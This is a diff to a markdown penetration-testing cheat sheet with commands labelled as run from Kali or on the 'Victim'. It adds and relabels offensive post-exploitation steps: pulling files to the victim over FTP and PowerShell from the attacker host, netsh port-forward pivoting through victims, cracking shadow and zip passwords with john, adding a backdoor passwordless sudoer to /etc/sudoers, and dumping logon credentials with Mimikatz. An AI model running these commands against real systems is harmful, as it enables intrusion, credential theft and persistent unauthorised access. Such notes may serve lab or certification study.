@@ -68,6 +68,12 @@
     smbclient '\\<RHOST>\<RPATH>' -c 'prompt OFF;recurse ON;lcd '.';mget *' -U 'User'
     ```
 
+    > Mounting SMB Shares
+
+    ```pwsh
+    mount -t cifs -o port=<RPORT> //<RHOST>/<RPATH> -o username=<RUSER>,password=<PASSWORD> /mnt/<LPATH>
+    ```
+
 + ### Compiling
 
     > x64 Compile
@@ -84,7 +90,7 @@
 
 + ### File Transfer
 
-    > **SCP**: Secure Copy with SSH
+    > **SCP**: From Kali to Victim
 
     ```pwsh
     scp <LPATH> <RUSER>@<RHOST>:<RPATH>
@@ -101,7 +107,7 @@
 
     ```pwsh
     KALI$ pyftp
-    Vict> echo "open 127.0.0.1 21\nuser anonymous anonymous\nbin\ncd <PATH>\nget <FILE>\nbye" | ftp -inv
+    Vict> echo "open <KALI> <KPORT>\nuser anonymous anonymous\nbin\ncd <PATH>\nget <FILE>\nbye" | ftp -inv
     ```
 
     > **FTP**: From Kali to Victim (Windows - PowerShell)
@@ -156,20 +162,27 @@
     ssh -N -R <KALI>:<LPORT>:127.0.0.1:<RPORT> <ROOT>@<KALI>
     ```
 
+    > Forward Static with NetSh (Windows): Kali => Victim A => Victim B
+
+    ```pwsh
+    Vict> netsh advfirewall firewall add rule name="forward_port_rule" protcol=TCP dir=in localip=<A-HOST> localport=<A-PORT> action=allow
+    Vict> netsh interface portproxy add v4tov4 listenport=<A-LPORT> listenaddress=<A-HOST> connectport=<B-PORT> connectaddress=<B-HOST>
+    ```
+
 + ### Password Cracking
 
     > Passwd & Shadow Files
 
     ```pwsh
-    > unshadow passwd shadow > passwords.txt
-    > john passwords.txt
+    Kali$ unshadow passwd shadow > passwords.txt
+    Kali$ john passwords.txt
     ```
 
     > Protected Zip Files
 
     ```pwsh
-    > zip2john file.zip > password.txt
-    > john passwords.txt
+    Kali$ zip2john file.zip > password.txt
+    Kali$ john passwords.txt
     ```
 
 ---
@@ -187,8 +200,8 @@
     > Fixing TTY
 
     ```pwsh
-    > python -c 'import pty; pty.spawn("/bin/sh")'
-    > python -c 'import pty; pty.spawn("/bin/bash")'
+    Vict$ python -c 'import pty; pty.spawn("/bin/sh")'
+    Vict$ python -c 'import pty; pty.spawn("/bin/bash")'
     ```
 
 + ### Process List
@@ -196,8 +209,8 @@
     > List Running Process
 
     ```pwsh
-    > ps aux
-    > ps aux | grep <PROCESS-NAME>
+    Vict$ ps aux
+    Vict$ ps aux | grep <PROCESS-NAME>
     ```
 
 + ### Liseners
@@ -205,7 +218,7 @@
     > List Liseners
 
     ```pwsh
-    > ss -antp | grep <PORT>
+    ss -antp | grep <PORT>
     ```
 
 + ### Add Local Sudoer
@@ -213,11 +226,11 @@
     > Using Sudoers File
 
     ```pwsh
-    > adduser Hacker --force-badname
-    > passwd Hacker1
-    > echo 'Hacker  ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
-    > su - Hacker
-    > sudo bash
+    Vict$ adduser Hacker --force-badname
+    Vict$ passwd Hacker1
+    Vict$ echo 'Hacker  ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
+    Vict$ su - Hacker
+    Vict$ sudo bash
     ```
 
 ---
@@ -229,7 +242,7 @@
     > Inside PowerShell
 
     ```pwsh
-    > Invoke-WebRequest -URI http://<LHOST>/<LPATH> -OutFile <FILE>
+    Invoke-WebRequest -URI http://<LHOST>/<LPATH> -OutFile <FILE>
     ```
 
     > Inside Command Line
@@ -249,7 +262,14 @@
     > net group
     ```
 
-    > Using Mimikatz
+    > Using NetStat.exe
+
+    ```pwsh
+    > netstat -anpb TCP
+    > netstat -anpb TCP | find "<LPORT>"
+    ```
+
+    > Using Mimikatz.exe
 
     ```pwsh
     > mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
